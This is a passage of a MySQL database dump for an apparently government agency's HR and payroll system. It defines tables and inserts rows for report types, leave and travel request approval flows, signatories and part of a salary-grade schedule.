INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('STIIEAL', 'STII Employees Association Loan', 'Remittance', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('NHMFC', 'National Home Mortgage Finance Corporation', 'Remittance', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('CIGNAFH', 'CIGNA Family Hospitalization', 'Remittance', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('DOSTSR', 'DOST Scholar Refund', 'Remittance', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('STIIEACL', 'STII Employees Association Contribution and Loan', 'Remittance', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('CEAP', 'CEAP (OP)', 'Remittance', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('ADSTIIEA', 'Additional Deduction STII Employee Association', 'Remittance', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('UOLIOP2', 'Unlimited Optional Life Insurance (OP) 2', 'Remittance', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('UOLIOP3', 'Unlimited Optional Life Insurance (OP) 3', 'Remittance', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('UOLIOP2L', 'Unlimited Optional Life Insurance (OP) 2 Loan', 'Remittance', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('UOLIOP3L', 'Unlimited Optional Life Insurance (OP) 3 Loan', 'Remittance', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('DOSTEAL', 'DOST Employee Association Loan', 'Remittance', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('HMOC', 'HMO Contribution', 'Remittance', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('AL', 'Application for Leave Form', '', '1', '2');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('PRO', 'Authorization to Render Overtime Form', 'x', 'x1', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('OB', 'Official Business Slip', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('BIR', 'Bureau of Internal Revenue Form', 'hold', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('RPSGA', 'List of Employees by Salary Grade (Alphabetical)', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('EAS', 'Employees Attendance Summary', '', '1', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('LWOP', 'List of Employees on Leave Without Pay', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('TR', 'Report on Tardiness', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('RPDHD', 'List of Employees By Date Hired', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('HYA', 'Report of Attendance', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('AAR', 'Report of Attendance and Accumulated Leave Credits', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('MRS', 'Quarterly Report on Separation', '', '1', '2');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('RPI', 'Personnel Individual Profile', '', '1', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('RPA', 'Report of Appointments Issued', '', '1', '2');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('RAF', 'Appointment Form', '', '1', '3');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('RCB', 'Trainings of staff', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('RPP', 'Plantilla of Personnel', '', '1', '2');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('RPDF', 'Position Description Form', '', '1', '2');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('RPAGE', 'List of Employees by Age\r\n', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('RPDH', 'Employees First Day of Service', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('RPSG', 'List of Employees by Salary Grade', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('RPE', 'List of Educational Attainment', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('RPBD', 'List of Employees by Date of Birth', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('RPS', 'List of Employees by Gender', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('ERMTN', 'Employee Remittances', 'EmpRemit', '2', '2');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('PSAC', 'Pay-Slip', 'Monthly', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('RPBDA', 'List of Employees\' Date of Birth (Alphabetical)', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('AR', 'Acceptance of Resignation', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('PK', 'Panunumpa sa Katungkulan', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('ADR', 'Assumption of Duties and Responsibilities', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('RMA', 'Quarterly Report on Accession', '', '1', '2');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('CSCPCA', 'CSC Plantilla of Contractual Appointment', '', '1', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('W2', 'W2', 'xYearly', 'x2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('EPD', 'Employees Profile', '', '1', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('DR', 'Deduction Register', 'Monthly', '2', '4');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('CNACL', 'Certification of Service for Loyalty Award', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('RLP', 'Loyalty Report', '', '1', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('RPSI', 'Employees Entitled to Salary Increment', '', '1', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('RPLS', 'List of Employees by Length of Service', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('NS', 'Notice of Step Increment', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('CACQ', 'Comparative Analysis of Candidates\' Qualifications', '', '1', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('IAAR', 'Individual Attendance and Accumulated Report', '', '1', '2');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('CNACLP', 'Certificate of No Administrative Charge (for legal purposes)', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('PC', 'Personnel Complement2', 'x', 'x1', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('AARO', 'Accumulated Report By Office', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('STRD', 'Sum Totals of Compulsory Deductions', 'Monthly', '2', '2');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('STD', 'Sum Totals of Deductions', 'Monthly', '2', '2');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('AARM', 'Report of Tardiness, Undertime and Absences', '', '1', '2');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('STMO', 'Sum Totals of Montly Obligations', 'Monthly', '2', '2');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('RMTNCREG', 'Remittances (Regular)', 'Monthly', '2', '2');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('SP', 'Summary of Payroll', 'Monthlyx', 'x2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('SDE', 'Summary of Detailed Employees', 'Monthlyx', 'x2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('PRZ', 'Payroll Register for Detailed Employees', 'Monthlyx', 'x2', '4');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('MTU', 'Tardy Report Memorandum', '', '', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('RPR', 'List of Retirees', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('RPV', 'List of Vacant Position(s)', '', '1', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('RPLT', 'List of Training Programs', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('OT', 'Overtime Pay', 'Income', '2', '4');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('MEAL', 'Meal Allowance', 'Incomex', 'x2', '4');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('ROC', 'Organizational Chart', '', '1', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('YEBON13', '13th Month Pay', 'Bonus', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('MYBON13', 'Interest Free Loan', 'Bonus', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('CHBON', 'Christmas Bonus', 'Bonus', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('PRBON', 'Productivity Bonus', 'Bonus', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('ANBON', 'Anniversary Bonus', 'Bonus', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('MIBON', 'Miles Stone Bonus', 'Bonus', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('MDCGF', 'Mid-year Cash Gift', 'Bonus', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('YECGF', 'Year-end Cash Gift', 'Bonus', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('ENRBON', 'Enrollment Assistance', 'Bonus', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('PENHBON', 'Productivity Enhancement Pay', 'Bonus', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('PERFBON', 'Performance Bonus', 'Bonus', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('HEABON', 'Health Care Insurance Bonus', 'Bonus', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('HON', 'Honorarium', 'Income', '2', '4');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('PRE', 'Payroll Register of Employee', 'Yearly', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('PSE', 'Payslips of Employee', 'Yearly', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('PDS', 'Personal Data Sheet', '', '1', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('RPDF2', 'Position Description Form (for vacant Position)', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('PSAC_AP', 'Pay-Slip w/ ACA and PERA', 'Monthly', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('PSAC_ALL', 'Pay-Slip w/ all benefits', 'Monthly', '2', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('RLP2', 'Loyalty Report (certifications)', '', '1', '0');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('NS2', 'Notice of Step Increment (Bulk Printing)', '', '1', '1');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('LONGI', 'Longevity Pay', 'Income', '2', '4');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('HAZARD', 'Hazard Pay', 'Income', '2', '4');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('LAUNDRY', 'Laundry Allowance', 'Income', '2', '4');
INSERT INTO `tblreporttype` (`reportCode`, `reportDesc`, `reportType`, `reportModule`, `numberOfSignatory`) VALUES ('SUBSIS', 'Subsistence', 'Income', '2', '4');


#
# TABLE STRUCTURE FOR: tblrequestapplicant
#

DROP TABLE IF EXISTS `tblrequestapplicant`;

CREATE TABLE `tblrequestapplicant` (
  `AppliCode` varchar(100) NOT NULL DEFAULT '',
  `Applicant` varchar(100) NOT NULL DEFAULT '',
  PRIMARY KEY (`AppliCode`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tblrequestapplicant` (`AppliCode`, `Applicant`) VALUES ('EXECUTIVE', 'Employees under Executive Office');
INSERT INTO `tblrequestapplicant` (`AppliCode`, `Applicant`) VALUES ('SERVICE', 'Employees under Service');
INSERT INTO `tblrequestapplicant` (`AppliCode`, `Applicant`) VALUES ('DIVISION', 'Employees under Division');
INSERT INTO `tblrequestapplicant` (`AppliCode`, `Applicant`) VALUES ('SECTION', 'Employees under Section');
INSERT INTO `tblrequestapplicant` (`AppliCode`, `Applicant`) VALUES ('SECTIONHEAD', 'Section Head');
INSERT INTO `tblrequestapplicant` (`AppliCode`, `Applicant`) VALUES ('DIVISIONHEAD', 'Division Head');
INSERT INTO `tblrequestapplicant` (`AppliCode`, `Applicant`) VALUES ('SERVICEHEAD', 'Service Head');
INSERT INTO `tblrequestapplicant` (`AppliCode`, `Applicant`) VALUES ('ALLEMP', 'All Employees');
INSERT INTO `tblrequestapplicant` (`AppliCode`, `Applicant`) VALUES ('EXEHEAD', 'Executive Office Head');


#
# TABLE STRUCTURE FOR: tblrequestflow
#

DROP TABLE IF EXISTS `tblrequestflow`;

CREATE TABLE `tblrequestflow` (
  `reqID` int(11) NOT NULL AUTO_INCREMENT,
  `RequestType` varchar(100) NOT NULL DEFAULT '',
  `Applicant` varchar(100) NOT NULL DEFAULT '',
  `Signatory1` varchar(100) NOT NULL DEFAULT '',
  `Signatory2` varchar(100) NOT NULL DEFAULT '',
  `Signatory3` varchar(100) NOT NULL DEFAULT '',
  `SignatoryFin` varchar(100) NOT NULL DEFAULT '',
  `isactive` int(11) NOT NULL DEFAULT 1,
  PRIMARY KEY (`reqID`)
) ENGINE=MyISAM AUTO_INCREMENT=105 DEFAULT CHARSET=latin1;

INSERT INTO `tblrequestflow` (`reqID`, `RequestType`, `Applicant`, `Signatory1`, `Signatory2`, `Signatory3`, `SignatoryFin`, `isactive`) VALUES ('70', 'Report', 'ALLEMP', '', '', '', 'CERTIFIED;;1125-CO0-1994', '1');
INSERT INTO `tblrequestflow` (`reqID`, `RequestType`, `Applicant`, `Signatory1`, `Signatory2`, `Signatory3`, `SignatoryFin`, `isactive`) VALUES ('99', 'MTL', 'ALLEMP', '', '', '', 'CERTIFIED;HR;1125-CO0-1994', '1');
INSERT INTO `tblrequestflow` (`reqID`, `RequestType`, `Applicant`, `Signatory1`, `Signatory2`, `Signatory3`, `SignatoryFin`, `isactive`) VALUES ('100', 'FL', 'ALLEMP', '', '', '', 'CERTIFIED;HR;1125-CO0-1994', '1');
INSERT INTO `tblrequestflow` (`reqID`, `RequestType`, `Applicant`, `Signatory1`, `Signatory2`, `Signatory3`, `SignatoryFin`, `isactive`) VALUES ('98', 'PTL', 'ALLEMP', '', '', '', 'CERTIFIED;HR;1125-CO0-1994', '1');
INSERT INTO `tblrequestflow` (`reqID`, `RequestType`, `Applicant`, `Signatory1`, `Signatory2`, `Signatory3`, `SignatoryFin`, `isactive`) VALUES ('96', 'STL', 'ALLEMP', '', '', '', 'CERTIFIED;HR;1125-CO0-1994', '1');
INSERT INTO `tblrequestflow` (`reqID`, `RequestType`, `Applicant`, `Signatory1`, `Signatory2`, `Signatory3`, `SignatoryFin`, `isactive`) VALUES ('102', 'PL', 'ALLEMP', '', '', '', 'CERTIFIED;HR;1125-CO0-1994', '1');
INSERT INTO `tblrequestflow` (`reqID`, `RequestType`, `Applicant`, `Signatory1`, `Signatory2`, `Signatory3`, `SignatoryFin`, `isactive`) VALUES ('52', 'Monetization', 'ALLEMP', ';EXECUTIVE;', '', '', 'APPROVED;HR;1125-CO0-1994', '1');
INSERT INTO `tblrequestflow` (`reqID`, `RequestType`, `Applicant`, `Signatory1`, `Signatory2`, `Signatory3`, `SignatoryFin`, `isactive`) VALUES ('88', 'OB', 'ALLEMP', '', '', '', 'CERTIFIED;HR;1125-CO0-1994', '1');
INSERT INTO `tblrequestflow` (`reqID`, `RequestType`, `Applicant`, `Signatory1`, `Signatory2`, `Signatory3`, `SignatoryFin`, `isactive`) VALUES ('87', 'DTR', 'ALLEMP', '', '', '', 'CERTIFIED;HR;1125-CO0-1994', '1');
INSERT INTO `tblrequestflow` (`reqID`, `RequestType`, `Applicant`, `Signatory1`, `Signatory2`, `Signatory3`, `SignatoryFin`, `isactive`) VALUES ('83', '201', 'ALLEMP', '', '', '', 'CERTIFIED;HR;1125-CO0-1994', '1');
INSERT INTO `tblrequestflow` (`reqID`, `RequestType`, `Applicant`, `Signatory1`, `Signatory2`, `Signatory3`, `SignatoryFin`, `isactive`) VALUES ('95', 'TO', 'ALLEMP', '', '', '', 'CERTIFIED;HR;1125-CO0-1994', '1');
INSERT INTO `tblrequestflow` (`reqID`, `RequestType`, `Applicant`, `Signatory1`, `Signatory2`, `Signatory3`, `SignatoryFin`, `isactive`) VALUES ('93', 'SL', 'ALLEMP', '', '', '', 'CERTIFIED;HR;1125-CO0-1994', '1');
INSERT INTO `tblrequestflow` (`reqID`, `RequestType`, `Applicant`, `Signatory1`, `Signatory2`, `Signatory3`, `SignatoryFin`, `isactive`) VALUES ('94', 'VL', 'ALLEMP', '', '', '', 'CERTIFIED;HR;1125-CO0-1994', '1');


#
# TABLE STRUCTURE FOR: tblrequestsignatory
#

DROP TABLE IF EXISTS `tblrequestsignatory`;

CREATE TABLE `tblrequestsignatory` (
  `SignCode` varchar(50) NOT NULL DEFAULT '',
  `Signatory` varchar(100) NOT NULL DEFAULT '',
  `SignHead` varchar(50) NOT NULL DEFAULT '',
  PRIMARY KEY (`SignCode`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tblrequestsignatory` (`SignCode`, `Signatory`, `SignHead`) VALUES ('SECHEAD', 'Section/Division/Service/Executive Office Head', '');
INSERT INTO `tblrequestsignatory` (`SignCode`, `Signatory`, `SignHead`) VALUES ('UNSEC', 'Undersecretary/Assistant Secreatary', '');
INSERT INTO `tblrequestsignatory` (`SignCode`, `Signatory`, `SignHead`) VALUES ('EXECUTIVE', 'Executive Office Head', '');
INSERT INTO `tblrequestsignatory` (`SignCode`, `Signatory`, `SignHead`) VALUES ('SECTION', 'Section Head', '');
INSERT INTO `tblrequestsignatory` (`SignCode`, `Signatory`, `SignHead`) VALUES ('DIVISION', 'Division Chief', '');
INSERT INTO `tblrequestsignatory` (`SignCode`, `Signatory`, `SignHead`) VALUES ('SERVICE', 'Service Head', '');
INSERT INTO `tblrequestsignatory` (`SignCode`, `Signatory`, `SignHead`) VALUES ('DEPUTY', 'Deputy Directors', '');
INSERT INTO `tblrequestsignatory` (`SignCode`, `Signatory`, `SignHead`) VALUES ('HR', 'HR Officer', '1258-CO0-2003');
INSERT INTO `tblrequestsignatory` (`SignCode`, `Signatory`, `SignHead`) VALUES ('PERSONNEL', 'Personnel Head', '1302-CO0-2009');
INSERT INTO `tblrequestsignatory` (`SignCode`, `Signatory`, `SignHead`) VALUES ('HRSUP', 'HR Supervisor', '1361-CO0-2008');


#
# TABLE STRUCTURE FOR: tblrequestsignatoryaction
#

DROP TABLE IF EXISTS `tblrequestsignatoryaction`;

CREATE TABLE `tblrequestsignatoryaction` (
  `ID` int(11) NOT NULL AUTO_INCREMENT,
  `ActionDesc` varchar(50) NOT NULL DEFAULT '',
  `ActionCode` varchar(50) NOT NULL DEFAULT '',
  PRIMARY KEY (`ID`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=latin1;

INSERT INTO `tblrequestsignatoryaction` (`ID`, `ActionDesc`, `ActionCode`) VALUES ('1', 'CERTIFY', 'CERTIFIED');
INSERT INTO `tblrequestsignatoryaction` (`ID`, `ActionDesc`, `ActionCode`) VALUES ('2', 'APPROVE', 'APPROVED');
INSERT INTO `tblrequestsignatoryaction` (`ID`, `ActionDesc`, `ActionCode`) VALUES ('3', 'RECOMMEND', 'RECOMMENDED');


#
# TABLE STRUCTURE FOR: tblrequesttype
#

DROP TABLE IF EXISTS `tblrequesttype`;

CREATE TABLE `tblrequesttype` (
  `requestCode` varchar(20) NOT NULL DEFAULT '',
  `requestDesc` text NOT NULL,
  PRIMARY KEY (`requestCode`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tblrequesttype` (`requestCode`, `requestDesc`) VALUES ('Leave', 'Leave');
INSERT INTO `tblrequesttype` (`requestCode`, `requestDesc`) VALUES ('OB', 'Official Business');
INSERT INTO `tblrequesttype` (`requestCode`, `requestDesc`) VALUES ('201', 'Update PDS');
INSERT INTO `tblrequesttype` (`requestCode`, `requestDesc`) VALUES ('Report', 'Reports');
INSERT INTO `tblrequesttype` (`requestCode`, `requestDesc`) VALUES ('Trainings', 'Seminars / Trainings');
INSERT INTO `tblrequesttype` (`requestCode`, `requestDesc`) VALUES ('TO', 'Travel Order');
INSERT INTO `tblrequesttype` (`requestCode`, `requestDesc`) VALUES ('DTR', 'DTR Update Request');


#
# TABLE STRUCTURE FOR: tblsalarysched
#

DROP TABLE IF EXISTS `tblsalarysched`;

CREATE TABLE `tblsalarysched` (
  `stepNumber` int(11) NOT NULL DEFAULT 0,
  `salaryGradeNumber` int(11) NOT NULL DEFAULT 0,
  `actualSalary` decimal(10,2) NOT NULL DEFAULT 0.00,
  `version` int(11) NOT NULL DEFAULT 1
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '1', '7697.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '1', '7820.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '1', '7947.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '1', '8077.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '1', '8209.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '1', '8342.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '1', '8480.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '2', '8189.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '2', '8321.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '2', '8456.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '2', '8594.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '2', '8733.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '2', '8876.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '2', '9022.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '2', '9170.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '3', '8854.00', '1');
